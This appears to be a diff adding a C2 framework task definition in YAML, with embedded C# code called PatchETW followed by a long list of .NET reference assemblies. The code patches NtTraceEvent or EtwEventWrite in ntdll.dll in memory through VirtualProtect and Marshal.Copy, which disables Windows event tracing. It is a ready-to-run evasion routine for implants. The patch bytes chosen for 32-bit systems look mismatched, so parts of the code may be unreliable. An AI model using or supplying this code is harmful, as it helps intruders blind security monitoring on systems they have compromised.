@@ -1,0 +1,125 @@
+- Name: PatchETW
+  Aliases: []
+  Author:
+    Name: Chinedu Onwukike
+    Handle: '@pytharmani'
+    Link: https://github.com/py7hagoras
+  Description: This patches ETW
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\nusing System.Text;\nusing System.Diagnostics;\nusing System.Linq;\nusing System.Security.Cryptography;\nusing System.Security.Principal;\n\n\n    public static class Task\n    {\n    \n    	[DllImport(\"kernel32\")]\n        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n\n        [DllImport(\"kernel32\")]\n        public static extern IntPtr LoadLibrary(string name);\n\n        [DllImport(\"kernel32\")]\n        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n        \n    	static string Message = \"Nothing yet\";\n    	public static string Execute ()\n        {\n        	if (is64Bit())\n            {\n            	PatchAddress(new byte[] { 0xc3, 0x00 }, \"ntdll.dll\", \"NtTraceEvent\");\n            } \n            else {\n            	PatchAddress(new byte[] { 0x48, 0xb8, 0xFF, 0xE0, 0x00 }, \"ntdll.dll\", \"EtwEventWrite\");\n            }\n\n            return Message;\n        }\n        \n        public static bool is64Bit()\n        {\n            bool is64Bit = true;\n\n            if (IntPtr.Size == 4)\n                is64Bit = false;\n\n            return is64Bit;\n        }\n    	\n        // https://github.com/passthehashbrowns/JoshC2/blob/ae75f0746b1977f13a8b10b89abf22b83cf7b41b/Implant/Evasion.cs\n        public static int PatchAddress(byte[] patch, string dll, string function)\n        {\n            try\n            {\n                uint oldProtect;\n\n                var loadDll = LoadLibrary(dll);\n                var etwEventSend = GetProcAddress(loadDll, function);\n\n                VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);\n                Marshal.Copy(patch, 0, etwEventSend, patch.Length);\n                Message = \"Successfully unhooked\";\n                return 0;\n            }\n            catch(Exception e)\n            {\n                Message = \"Error unhooking\";\n                return 1;\n            }\n           \n        }\n    }"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.Configuration.Install.dll
+    Location: net35/System.Configuration.Install.dll
+    DotNetVersion: Net35
+  - Name: System.Web.Extensions.dll
+    Location: net40/System.Web.Extensions.dll
+    DotNetVersion: Net40
+  - Name: System.DirectoryServices.dll
+    Location: net40/System.DirectoryServices.dll
+    DotNetVersion: Net40
+  - Name: System.Drawing.dll
+    Location: net40/System.Drawing.dll
+    DotNetVersion: Net40
+  - Name: System.DirectoryServices.Protocols.dll
+    Location: net40/System.DirectoryServices.Protocols.dll
+    DotNetVersion: Net40
+  - Name: System.Windows.Forms.dll
+    Location: net40/System.Windows.Forms.dll
+    DotNetVersion: Net40
+  - Name: System.Management.Automation.dll
+    Location: net40/System.Management.Automation.dll
+    DotNetVersion: Net40
+  - Name: System.ServiceProcess.dll
+    Location: net40/System.ServiceProcess.dll
+    DotNetVersion: Net40
+  - Name: System.Core.dll
+    Location: net40/System.Core.dll
+    DotNetVersion: Net40
+  - Name: System.Security.dll
+    Location: net40/System.Security.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: System.IdentityModel.dll
+    Location: net40/System.IdentityModel.dll
+    DotNetVersion: Net40
+  - Name: System.XML.dll
+    Location: net40/System.XML.dll
+    DotNetVersion: Net40
+  - Name: System.DirectoryServices.AccountManagement.dll
+    Location: net40/System.DirectoryServices.AccountManagement.dll
+    DotNetVersion: Net40
+  - Name: System.Configuration.Install.dll
+    Location: net40/System.Configuration.Install.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  - Name: System.Management.dll
+    Location: net35/System.Management.dll
+    DotNetVersion: Net35
+  - Name: System.Data.dll
+    Location: net35/System.Data.dll
+    DotNetVersion: Net35
+  - Name: System.ServiceProcess.dll
+    Location: net35/System.ServiceProcess.dll
+    DotNetVersion: Net35
+  - Name: System.Windows.Forms.dll
+    Location: net35/System.Windows.Forms.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.Protocols.dll
+    Location: net35/System.DirectoryServices.Protocols.dll
+    DotNetVersion: Net35
+  - Name: System.Data.DataSetExtensions.dll
+    Location: net35/System.Data.DataSetExtensions.dll
+    DotNetVersion: Net35
+  - Name: System.Drawing.dll
+    Location: net35/System.Drawing.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.dll
+    Location: net35/System.DirectoryServices.dll
+    DotNetVersion: Net35
+  - Name: System.Web.Extensions.dll
+    Location: net35/System.Web.Extensions.dll
+    DotNetVersion: Net35
+  - Name: System.Management.Automation.dll
+    Location: net35/System.Management.Automation.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: System.Security.dll
+    Location: net35/System.Security.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: System.IdentityModel.dll
+    Location: net35/System.IdentityModel.dll
+    DotNetVersion: Net35
+  - Name: System.XML.dll
+    Location: net35/System.XML.dll
+    DotNetVersion: Net35
+  - Name: System.DirectoryServices.AccountManagement.dll
+    Location: net35/System.DirectoryServices.AccountManagement.dll
+    DotNetVersion: Net35
+  - Name: System.Data.dll
+    Location: net40/System.Data.dll
+    DotNetVersion: Net40
+  - Name: System.Management.dll
+    Location: net40/System.Management.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
